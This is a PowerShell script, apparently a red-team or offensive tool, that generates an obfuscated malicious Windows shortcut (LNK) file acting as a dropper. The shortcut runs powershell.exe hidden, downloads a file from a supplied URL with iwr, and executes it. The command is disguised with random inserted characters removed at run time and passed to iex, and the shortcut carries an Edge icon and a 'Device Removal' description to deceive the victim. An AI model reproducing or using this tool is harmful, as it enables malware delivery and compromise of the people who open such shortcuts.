function LNK-Generator {
<#
    .SYNOPSIS

        Generate an obfuscated malicious LNK file as a dropper.

    .PARAMETER URL

        URL to download file. 

    .PARAMETER dropPath

        The path you want to drop your file in.
   
   .EXAMPLE

        LNK-Generator https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe C:\Windows\Temp\putty.exe

#>
        [CmdletBinding(DefaultParameterSetName = 'None')]
        param(

        [Parameter(Mandatory=$True)]
        [String]
        $URL,

        [Parameter(Mandatory=$True)]
        [String]
        $dropPath

    )

    
    Write-Host "  _    _  _ _  __    ___                       _           
 | |  | \| | |/ /__ / __|___ _ _  ___ _ _ __ _| |_ ___ _ _ 
 | |__| .` | ' <___| (_ / -_) ' \/ -_) '_/ _` |  _/ _ \ '_|
 |____|_|\_|_|\_\   \___\___|_||_\___|_| \__,_|\__\___/_|  
 Generate an obfuscated malicious LNK file as a dropper.   "

    $guid = [guid]::NewGuid().ToString()

    Write-Host "[+] URL: $URL"
    Write-Host "[+] Drop path: $dropPath"
    Write-Host "[+] Your lnk file: $pwd\$guid.lnk"

    $userPayload = "iwr $URL -O $dropPath;$dropPath".ToCharArray()
    $randomString = '㆐', '㆑', '㆒', '㆓', '㆔', '㆕', '㆖', '㆗', '㆘', '㆙', '㆚', '㆛', 	'㆜', '㆝', '㆞', '㆟' 
    $getRandom = Get-Random $randomString
    $cmd = ""
    $counter = 0
    foreach($item in $userPayload)
    {
        $counter = 1+$counter
        if ($counter -eq 3)
        {
        $cmd += $getRandom + $item
        $counter = 0

        }
        else
        {
        $cmd += $item
        }
    }


    $payload = "'$cmd'.Replace('$getRandom','')|iex"
    Write-Host "[+] Payload: $payload"
    
    # https://www.computerperformance.co.uk/powershell/create-shortcut/
    $AppLocation = "powershell.exe"
    $WshShell = New-Object -ComObject WScript.Shell
    $Shortcut = $WshShell.CreateShortcut("$pwd\$guid.lnk")
    $Shortcut.TargetPath = $AppLocation
    $Shortcut.Arguments = $payload
    $Shortcut.IconLocation = 'C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,13'
    $Shortcut.Description ="Device Removal"
    $Shortcut.WindowStyle = '7'
    $Shortcut.WorkingDirectory ="C:\Program Files\"
    $Shortcut.Save()
}
